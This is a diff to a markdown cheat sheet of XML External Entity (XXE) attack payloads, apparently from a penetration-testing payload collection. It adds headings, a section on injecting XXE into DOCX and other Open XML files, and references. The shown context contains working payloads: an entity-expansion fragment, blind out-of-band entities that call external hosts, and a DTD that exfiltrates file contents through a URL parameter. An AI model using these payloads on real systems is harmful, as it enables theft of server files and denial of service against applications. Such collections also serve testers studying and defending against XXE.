@@ -101,9 +101,9 @@ h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
 i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
-## Blind XXE
+## Blind XXE - Out of Band
 
-Blind XXE
+### Blind XXE
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -116,7 +116,7 @@ Blind XXE
 <foo>&callhome;</foo>
 ```
 
-XXE OOB Attack (Yunusov, 2013)
+### XXE OOB Attack (Yunusov, 2013)
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -129,7 +129,7 @@ File stored on http://publicServer.com/parameterEntity_oob.dtd
 %all;
 ```
 
-XXE OOB with DTD and PHP filter
+### XXE OOB with DTD and PHP filter
 
 ```xml
 <?xml version="1.0" ?>
@@ -146,10 +146,35 @@ File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
 
-XXE Inside SOAP
+### XXE Inside SOAP
 
 ```xml
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+```
+
+### XXE Inside DOCX file
+
+Format of an Open XML file (inject the payload in any .xml file):
+
+- /_rels/.rels
+- [Content_Types].xml
+- Default Main Document Part
+  - /word/document.xml
+  - /ppt/presentation.xml
+  - /xl/workbook.xml
+
+Then update the file `zip -u xxe.docx [Content_Types].xml`
+
+Tool : https://github.com/BuffaloWill/oxml_xxe
+
+```xml
+DOCX/XLSX/PPTX
+ODT/ODG/ODP/ODS
+SVG
+XML
+PDF (experimental)
+JPG (experimental)
+GIF (experimental)
 ```
 
 ## Thanks to
@@ -158,3 +183,5 @@ XXE Inside SOAP
 * [Detecting and exploiting XXE in SAML Interfaces - Von Christian Mainka](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
 * [staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 * [mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
+* [Exploiting xxe in file upload functionality - BLACKHAT WEBCAST- 11/19/15 Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
+* [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer)](http://en.hackdig.com/08/28075.htm)
